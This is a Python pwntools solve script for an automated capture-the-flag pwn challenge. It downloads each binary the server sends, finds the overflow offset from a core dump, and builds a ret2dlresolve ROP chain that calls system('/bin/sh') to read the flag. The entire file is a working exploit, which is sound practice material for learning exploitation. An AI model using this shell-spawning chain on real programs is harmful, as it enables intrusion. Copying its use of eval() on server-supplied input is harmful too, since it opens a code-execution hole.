import pwn
import subprocess
import re
import os
import stat


def get_rip_offset(chall):
    # Generate a cyclic pattern so that we can auto-find the offset
    payload = pwn.cyclic(128)

    # Run the process once so that it crashes
    io = pwn.process(chall)
    io.sendline(payload)
    io.wait()

    # Get the core dump
    core = pwn.Coredump("./core")

    # Our cyclic pattern should have been used as the crashing address
    offset = pwn.cyclic_find(core.fault_addr & (2 ** 32 - 1))
    return offset


def get_ret2dlresolve(elf, offset):
    # Pwntools script kiddie solution
    bss = elf.bss(0x100 - 8)
    ret2dl = pwn.Ret2dlresolvePayload(elf, "system", ["/bin/sh"], bss)
    rop = pwn.ROP(elf)
    rop.raw(rop.ret.address)  # ret gadget to align stack
    rop.gets(bss)
    rop.ret2dlresolve(ret2dl)
    return b"A" * offset + rop.chain() + b"\n" + ret2dl.payload


def solve(io):
    for i in range(4):
        io.recvline()

    while True:
        s = io.recvlineS().strip()
        s = s[: s.rfind("'") + 1]
        s = eval(s)
        open("chall", "wb").write(s)
        st = os.stat("chall")
        os.chmod("chall", st.st_mode | stat.S_IEXEC)

        pwn.context.binary = elf = pwn.ELF("chall")
        offset = get_rip_offset("chall")
        payload = get_ret2dlresolve(elf, offset)
        io.sendline(payload)

        io.sendline("cat flag.txt")
        out = io.recvuntil("}")
        start, end = out.rfind(b"bctf{"), out.rfind(b"}")
        flag = out[start : end + 1]
        print(f"[+] Flag: {flag}")

        io.sendline("exit")
        io.sendlineafter("flag>", flag)


# pwn.context.log_level = "debug"
io = pwn.remote("chal.b01lers.com", 4001)

try:
    solve(io)
except KeyboardInterrupt:
    raise
except:
    io.interactive()
